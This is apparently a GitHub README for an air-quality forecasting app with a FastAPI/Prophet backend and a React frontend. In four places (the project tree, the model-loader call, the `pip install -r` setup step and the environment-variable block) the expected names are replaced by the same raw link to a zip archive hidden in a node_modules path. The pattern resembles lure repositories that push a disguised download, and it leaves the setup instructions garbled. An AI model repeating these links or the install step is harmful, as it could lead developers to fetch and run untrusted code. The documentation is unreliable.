# AQI_Forecasting

A full-stack Air Quality Index (AQI) forecasting application with a FastAPI backend (Prophet-based 30-day forecasts and on-demand inference) and a React frontend featuring maps and charts for interactive exploration.

## ✨ Features

- **Forecasting API (FastAPI):** endpoints for point inference and 30-day forecasts (Prophet).  
- **Model loader abstraction:** simple hot-swap of trained models via a loader utility.  
- **React UI:** calendar picker, line charts, city search, and a live clock.  
- **Maps:** Leaflet map with marker + popup; recenters when a new city is selected.  
- **Charts:** Recharts line chart for “30-Day AQI Forecast.”  
- **UI polish:** lucide-react icons, framer-motion animations.

## 🏗️ Project Structure

```
AQI_Forecasting/
├── backend/           # FastAPI app, model loading, prediction/forecast routes
├── frontend/          # React app (Leaflet, Recharts, framer-motion, lucide-react)
├── .gitignore
└── https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-interpolate/src/transform/Forecasting-AQ-v1.1.zip
```

## 🧰 Tech Stack

**Backend**
- Python, FastAPI, Uvicorn
- Prophet (time-series forecasting)
- Pydantic for request schemas
- Requests (external data fetch, if needed)

**Frontend**
- React (hooks)
- Leaflet (map)
- Recharts (charts)
- framer-motion (animations)
- lucide-react (icons)
- react-calendar (date UI)

## 🔌 API Endpoints

Base URL (dev): `http://127.0.0.1:8000`

### Health
`GET /` → `{ "status": "ok" }`

### Inference (single point)
`POST /predict`
```json
{
  "PM25": 42.0,
  "PM10": 80.0,
  "NO2": 18.0,
  "NO": 0.0,
  "NH3": 0.0
}
```

### 30-Day Forecast
`GET /forecast?city=Chennai`  
Optional: `lat`, `lon`, `start_date` (ISO), `horizon_days` (default 30)

Response:
```json
{
  "city": "Chennai",
  "horizon_days": 30,
  "series": [
    {"date": "2025-09-26", "aqi": 102.1},
    ...
  ]
}
```

## 🧪 Model

- Trained **Prophet** model on historical AQI data.  
- Saved artifact loaded at API start via `https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-interpolate/src/transform/Forecasting-AQ-v1.1.zip()`.  
- Forecast pipeline:
  1. Build future dataframe for 30 days.
  2. Prophet `predict` → extract `yhat` as AQI.
  3. Return compact series for the frontend chart.

## 🖥️ Frontend UX

- **City search** triggers geocoding → map re-centers.  
- **30-Day AQI Forecast** line chart renders `/forecast` data.  
- **Calendar** lets users pick dates.  
- **Live 24h clock** updates every second.

## 🚀 Getting Started

### Backend

```bash
cd backend
python -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-interpolate/src/transform/Forecasting-AQ-v1.1.zip
uvicorn main:app --reload
```

### Frontend

```bash
cd frontend
npm install
npm run dev
```

- Update `API_BASE` in code/config if your backend runs elsewhere.

## 🔄 Environment Variables

Backend:
```
https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-interpolate/src/transform/Forecasting-AQ-v1.1.zip
```

Frontend:
```
VITE_API_BASE=http://127.0.0.1:8000
```

## 📡 Example cURL

```bash
curl http://127.0.0.1:8000/
curl -X POST http://127.0.0.1:8000/predict \
  -H "Content-Type: application/json" \
  -d '{"PM25":42,"PM10":80,"NO2":18,"NO":0,"NH3":0}'
```

## ✅ Notes

- **CORS** is enabled for dev.  
- **Type-safe** request validation via Pydantic.  
- **Map recentering** works when searching new city.  
- Consider adding Prophet confidence bands (`yhat_lower/upper`) to chart.

## 🛣️ Roadmap

- Add unit tests for forecasting pipeline.  
- Add city autocomplete with debounce.  
- Persist recent searches in localStorage.  
- Dockerize backend & frontend.

## 🤝 Contributing

PRs and issues welcome. Please open an issue to discuss major changes first.

## 📜 License

Add a LICENSE file (MIT recommended) at the repo root.
